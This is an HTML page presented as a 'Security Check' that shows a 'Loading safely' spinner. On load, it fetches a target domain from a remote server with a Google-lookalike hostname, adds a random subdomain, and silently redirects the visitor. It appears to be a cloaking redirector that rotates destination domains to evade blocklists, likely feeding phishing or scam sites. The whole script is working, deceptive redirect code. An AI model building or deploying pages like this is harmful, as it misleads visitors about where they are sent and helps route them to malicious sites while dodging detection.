<!DOCTYPE html>
<html>
<head>
    <title>Security Check</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: #f8f9fa;
            font-family: 'Segoe UI', Arial, sans-serif;
            overflow: hidden;
        }
        .loader-container {
            text-align: center;
            animation: fadeIn 0.5s ease-out;
        }
        .loader {
            display: inline-block;
            width: 80px;
            height: 80px;
            margin-bottom: 20px;
        }
        .loader:after {
            content: " ";
            display: block;
            width: 64px;
            height: 64px;
            margin: 8px;
            border-radius: 50%;
            border: 6px solid #4285f4;
            border-color: #4285f4 transparent #4285f4 transparent;
            animation: loader-rotate 1.2s linear infinite;
        }
        .loading-text {
            font-size: 18px;
            color: #333;
            margin-top: 20px;
            position: relative;
        }
        .loading-text:after {
            content: "...";
            position: absolute;
            animation: dot-pulse 1.5s infinite;
            width: 20px;
            display: inline-block;
            text-align: left;
        }
        .admin-alert {
            display: none;
            margin-top: 20px;
            padding: 15px;
            background: #ffeef0;
            border-radius: 5px;
            color: #d73a49;
            animation: fadeIn 0.5s ease-out;
        }
        @keyframes loader-rotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @keyframes dot-pulse {
            0%, 20% { content: "."; }
            40% { content: ".."; }
            60%, 100% { content: "..."; }
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="loader-container">
        <div class="loader"></div>
        <div class="loading-text">Loading safely</div>
        <div class="admin-alert" id="adminAlert">
            No available domain. Please contact administrator.
        </div>
    </div>

    <script>
        // 执行重定向
        fetch('https://goog05.ptna2016.cc/get_links.php')
            .then(response => {
                if (!response.ok) throw new Error('Network error');
                return response.text();
            })
            .then(domain => {
                domain = domain.trim();
                
                // 检查是否为空
                if (!domain) {
                    document.getElementById('adminAlert').style.display = 'block';
                    document.querySelector('.loading-text').textContent = 'Loading failed, contact the administrator';
                    return;
                }
                
                // 生成4位随机子
                const random4Char = () => Math.random().toString(36).substring(2, 6);
                const subdomain = random4Char();
                
                // 确保使用HTTPS
                if (!domain.startsWith('http')) {
                    domain = 'https://' + domain;
                }
                
                // 构建最终URL
                const url = new URL(domain);
                url.hostname = `${subdomain}.${url.hostname}`;
                url.pathname = '';
                
                window.location.href = url.toString();
            })
            .catch(error => {
                document.getElementById('adminAlert').style.display = 'block';
                document.querySelector('.loading-text').textContent = 'Connection error';
                console.error('Redirect error:', error);
            });
    </script>
</body>

</html>
